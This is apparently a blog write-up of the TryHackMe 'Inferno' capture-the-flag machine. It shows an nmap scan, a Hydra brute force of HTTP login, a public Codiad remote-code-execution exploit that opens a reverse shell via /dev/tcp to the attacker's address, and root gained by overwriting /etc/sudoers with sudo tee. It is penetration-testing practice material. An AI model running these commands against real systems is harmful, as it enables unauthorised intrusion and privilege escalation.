---
layout: project
type: project
image: images/writeups/thm/inferno/logo.png
title: Inferno - TryHackMe
permalink: writeups/inferno
# All dates must be YYYY-MM-DD format!
date: 2021-03-22
labels:
  - TryHackMe
  - boot2root
  - Medium
summary: Real Life machine + CTF. The machine is designed to be real-life (maybe not?) and is perfect for newbies starting out in penetration testing
---

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/inferno/header.png">
<script src="https://www.tryhackme.com/badge/192700"></script>

```
MACHINE = INFERNO
TARGET = VARIABLE
TUN0 = 10.9.169.84
OS = LINUX
DIFFICULTY = MEDIUM
```

## Enumeration

Starting with an nmap scan

```bash
~/Documents/tryhackme/inferno ❯ cat nmap/init
# Nmap 7.91 scan initiated Tue Feb 16 15:40:10 2021 as: nmap -sS -sV -T5 -sC -oN nmap/init 10.10.175.172
Warning: 10.10.175.172 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.175.172
Host is up (0.35s latency).
Not shown: 532 closed ports, 439 filtered ports
PORT      STATE SERVICE           VERSION
21/tcp    open  ftp?
22/tcp    open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
|_  256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
23/tcp    open  telnet?
25/tcp    open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http              Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Dante's Inferno
106/tcp   open  pop3pw?
110/tcp   open  pop3?
389/tcp   open  ldap?
443/tcp   open  https?
464/tcp   open  kpasswd5?
636/tcp   open  ldapssl?
777/tcp   open  multiling-http?
808/tcp   open  ccproxy-http?
1236/tcp  open  bvcontrol?
1300/tcp  open  h323hostcallsc?
2000/tcp  open  cisco-sccp?
2003/tcp  open  finger?
|_finger: ERROR: Script execution failed (use -d to debug)
2121/tcp  open  ccproxy-ftp?
2601/tcp  open  zebra?
2602/tcp  open  ripd?
2607/tcp  open  connection?
2608/tcp  open  wag-service?
5432/tcp  open  postgresql?
6346/tcp  open  gnutella?
6667/tcp  open  irc?
|_irc-info: Unable to open connection
8021/tcp  open  ftp-proxy?
9418/tcp  open  git?
10000/tcp open  snet-sensor-mgmt?
10082/tcp open  amandaidx?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 16 15:41:58 2021 -- 1 IP address (1 host up) scanned in 107.64 seconds
```

Enumerating http
I did some manual enumeration and found a directory /inferno wich required login credentials
I decided to bruteforce the basic http authentication with hydra and username admin, because why not admin
Yes, it actually took 20 minutes to find something I should have probably guessed

```bash
~/Documents/tryhackme/inferno ❯ cat gobuster-medium-root
/inferno (Status: 401)
~/Documents/tryhackme/inferno ❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.175.172 http-get /inferno/ | tee hydra-inferno
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-16 16:39:53
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.175.172:80/inferno/
[STATUS] 755.00 tries/min, 755 tries in 00:01h, 14343644 to do in 316:39h, 16 active
[STATUS] 789.33 tries/min, 2368 tries in 00:03h, 14342031 to do in 302:50h, 16 active
[STATUS] 886.29 tries/min, 6204 tries in 00:07h, 14338195 to do in 269:38h, 16 active
[STATUS] 748.33 tries/min, 11225 tries in 00:15h, 14333174 to do in 319:14h, 16 active
[80][http-get] host: 10.10.175.172   login: admin   password: dante1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-16 16:59:31
```

## Exploitation

After logging in I get another login page and I just retry the credntials and I get access to a "Codiad" page
It seems to be a web based ide
I searched for a reverse shell and found a github project on it

```bash
~/Documents/tryhackme/inferno ❯ cd codiad
~/Documents/tryhackme/inferno/codiad ❯ git clone https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit.git
Cloning into 'Codiad-Remote-Code-Execute-Exploit'...
remote: Enumerating objects: 133, done.
remote: Total 133 (delta 0), reused 0 (delta 0), pack-reused 133
Receiving objects: 100% (133/133), 2.15 MiB | 356.00 KiB/s, done.
Resolving deltas: 100% (56/56), done.
~/Documents/tryhackme/inferno/codiad ❯ cd Codiad-Remote-Code-Execute-Exploit
~/Doc/tryhackme/i/c/Codiad-Remote-Code-Execute-Exploit ❯ python exploit.py
Usage :
        python exploit.py [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
        python exploit.py [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
Example :
        python exploit.py http://localhost/ admin admin 8.8.8.8 8888 linux
        python exploit.py http://localhost:8080/ admin admin 8.8.8.8 8888 windows
Author :
        WangYihang <wangyihanger@gmail.com>

~/Doc/tryhackme/i/c/Codiad-Remote-Code-Execute-Exploit ❯ python exploit.py http://admin:dante1@10.10.175.172/infern
o/ 'admin' 'dante1' 10.9.169.84 4444 linux
[+] Please execute the following command on your vps:
echo 'bash -c "bash -i >/dev/tcp/10.9.169.84/4445 0>&1 2>&1"' | nc -lnvp 4444
nc -lnvp 4445
[+] Please confirm that you have done the two command above [y/n]
[Y/n] y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"admin"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"inferno","path":"\/var\/www\/html\/inferno"}}
[+] Writeable Path : /var/www/html/inferno
[+] Sending payload...
{"status":"error","message":"No Results Returned"}
[+] Exploit finished!
[+] Enjoy your reverse shell!

~/Documents/tryhackme/inferno ❯ nc -lnvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.175.172 46074
bash: cannot set terminal process group (917): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Inferno:/var/www/html/inferno/components/filemanager$
```

I found a file in the user dante's Downloads directory and it was in hex

```bash
www-data@Inferno:/var/www/html/inferno/components/filemanager$ cat /home/dante/Downloads/.download.dat
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 ...snip... 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0

#decoded to
«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:XXXXXXXXXX.

#probably the user's password so I can ssh
```

## Privilege Escalation

After using the credentials to login via ssh it was pretty straight forward to root

```bash
~/Doc/tryhackme/i/c/Codiad-Remote-Code-Execute-Exploit ❯ ssh dante@10.10.175.172                                 
dante@10.10.175.172's password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-130-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Feb 16 16:44:49 UTC 2021

  System load:  0.0               Processes:           590
  Usage of /:   42.0% of 8.79GB   Users logged in:     0
  Memory usage: 63%               IP address for eth0: 10.10.175.172
  Swap usage:   0%

  => There are 2 zombie processes.


39 packages can be updated.
0 updates are security updates.


Last login: Mon Jan 11 15:56:07 2021 from 192.168.1.109
dante@Inferno:~$ cat local.txt; whoami; id; uname -a
XXXXXXXXXX
dante
uid=1000(dante) gid=1000(dante) groups=1000(dante),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
Linux Inferno 4.15.0-130-generic #134-Ubuntu SMP Tue Jan 5 20:46:26 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
dante@Inferno:~$ sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee

dante@Inferno:~$ echo "dante ALL=(ALL) ALL" | sudo /usr/bin/tee /etc/sudoers
dante ALL=(ALL) ALL
dante@Inferno:~$ sudo -l
[sudo] password for dante:
User dante may run the following commands on Inferno:
    (ALL) ALL
dante@Inferno:~$ sudo su
root@Inferno:/home/dante# cd /root
root@Inferno:~# cat proof.txt
Congrats!

You've rooted Inferno!

XXXXXXXXXX

mindsflee
root@Inferno:~#
```

pwned
